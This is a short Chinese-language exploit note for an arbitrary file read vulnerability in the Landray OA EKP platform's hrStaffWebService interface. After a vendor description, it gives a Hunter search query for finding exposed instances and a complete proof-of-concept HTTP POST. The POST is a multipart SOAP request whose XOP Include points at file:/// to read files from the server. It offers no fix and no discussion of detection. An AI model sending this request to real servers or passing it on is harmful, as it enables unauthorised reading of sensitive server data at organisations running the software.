# 蓝凌OA-EKP系统接口hrStaffWebService存在任意文件读取漏洞
蓝凌核心产品EKP平台定位为新一代数字化生态OA平台，数字化向纵深发展，正加速构建产业互联网，对企业协作能力提出更高要求，蓝凌新一代生态型OA平台能够支撑办公数字化、管理智能化、应用平台化、组织生态化，赋能大中型组织更高效的内外协作与管理，支撑商业模式创新与转型发展。深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用该漏洞获取服务器敏感信息。

# hunter
```javascript
app.name="Landray 蓝凌OA"
```

![](https://cdn.nlark.com/yuque/0/2023/png/1622799/1699624430077-2cffea44-6670-4ae3-81c6-97bae85b26fd.png)

## poc
```java
POST /sys/webservice/hrStaffWebService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Content-Length: 563
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US;q=0.9,en;q=0.8
Cache-Control: max-age=0
Connection: close
Content-Type: multipart/related; boundary=----frhpvivnctknnkiwugaq
SOAPAction: ""

------frhpvivnctknnkiwugaq
Content-Disposition: form-data; name="1"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.staff.hr.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getHrStaffElements>
        <arg0>
            <beginTimeStamp>1</beginTimeStamp>
            <count><xop:Include 
xmlns:xop="http://www.w3.org/2004/08/xop/include" 
href="file:///"/></count>
        </arg0>
    </web:getHrStaffElements>
</soapenv:Body>
</soapenv:Envelope>
------frhpvivnctknnkiwugaq--
```

![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1730429801848-e18487e1-ff5e-479a-af65-8a405e0f6c6b.png)

